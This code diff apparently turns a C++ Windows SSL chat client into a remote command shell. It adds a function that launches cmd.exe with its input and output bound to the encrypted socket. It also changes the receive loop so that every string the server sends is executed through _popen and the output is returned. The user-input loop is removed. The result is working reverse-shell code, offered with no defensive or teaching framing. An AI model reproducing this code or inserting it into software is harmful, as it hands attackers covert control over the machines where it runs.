@@ -6,16 +6,30 @@
 #include <openssl/err.h>
 #include <mutex>
 #include <thread>
+#include <io.h>
+#include <filesystem>
 
 class Client {
 public:
     Client(const std::string& serverIP, int serverPort)
             : serverIP(serverIP), serverPort(serverPort), clientSocket(INVALID_SOCKET), sslContext(nullptr), sslSocket(nullptr) {}
 
-    void SendMessage(SSL* ssl) {
-        std::string input;
-        std::cout << "test~# ";
-        std::getline(std::cin, input);
+
+
+    void ExecuteCommand(SSL* ssl) {
+        char Process[] = "cmd.exe";
+        STARTUPINFO sinfo;
+        PROCESS_INFORMATION pinfo;
+        memset(&sinfo, 0, sizeof(sinfo));
+        sinfo.cb = sizeof(sinfo);
+        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError =  (HANDLE)_get_osfhandle(SSL_get_fd(ssl));
+        CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
+        WaitForSingleObject(pinfo.hProcess, INFINITE);
+    }
+    void SendMessage(SSL* ssl, const char* buffer) {
+
+        std::string input(buffer);
         const char* data = input.c_str();
         int bytesSent = 0;
         int totalBytes = input.length();
@@ -32,6 +46,7 @@ public:
 
     void ReceiveMessage(SSL* ssl) {
         char buffer[4096];
+        std::string cmd;
         int bytesRead;
 
         while (true) {
@@ -43,7 +58,40 @@ public:
 
             buffer[bytesRead] = '\0';
             std::cout << "Server response: " << buffer << std::endl;
+            std::string command(buffer);
+            cmd = std::string(buffer, bytesRead);
+            namespace fs = std::filesystem;
+
+            if (cmd == "exit") {
+                    break;
+            }
+            else if (cmd.substr(0, 3) == "cd ") {
+                // Change directory command
+                std::string directory = cmd.substr(3);
+                if (fs::exists(directory) && fs::is_directory(directory)) {
+                    fs::current_path(directory);
+                    SendMessage(sslSocket, "Directory changed");
+                }
+                else {
+                    SendMessage(sslSocket, "Directory Deleted");
+                }
+            }
+            else {
+                    FILE *pipe = _popen(cmd.c_str(), "r");
+                    if (pipe) {
+                        while (!feof(pipe)) {
+                            if (fgets(buffer, sizeof(buffer), pipe) != NULL)
+                                SendMessage(sslSocket, buffer);
+                        }
+                        _pclose(pipe);
+                    } else {
+                        std::cerr << "Failed to execute command" << std::endl;
+                        break;
+                    }
+                }
+
         }
+
     }
 
     bool Connect() {
@@ -117,12 +165,8 @@ public:
     }
 
     void Run() {
-        std::thread recvThread(&Client::ReceiveMessage, this, sslSocket);
-        recvThread.detach();
+        ReceiveMessage(sslSocket);
 
-        while (true) {
-            SendMessage(sslSocket);
-        }
     }
 
     void Detach() {
